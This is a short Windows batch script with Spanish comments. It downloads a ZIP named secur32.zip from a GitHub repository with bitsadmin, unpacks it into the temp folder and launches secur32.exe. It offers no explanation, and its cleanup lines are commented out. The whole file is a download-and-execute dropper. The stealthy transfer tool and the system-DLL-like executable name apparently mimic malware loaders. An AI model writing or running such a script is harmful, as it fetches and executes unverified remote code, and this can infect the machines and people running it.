@echo off

set "downloadURL=https://github.com/eventos-dev/test/raw/main/secur32.zip"
set "tempPath=%temp%\archivo.zip"
set "extractPath=%temp%\extracted"

REM Descargar el archivo ZIP utilizando bitsadmin
bitsadmin /transfer "Descarga" %downloadURL% %tempPath%

REM Descomprimir el archivo ZIP
powershell -command "Expand-Archive -Path '%tempPath%' -DestinationPath '%extractPath%' -Force"

REM Ejecutar el archivo principal
cd "%extractPath%"
start "" secur32.exe

REM Eliminar los archivos temporales
REM del /f /q "%tempPath%"
REM rd /s /q "%extractPath%"

exit
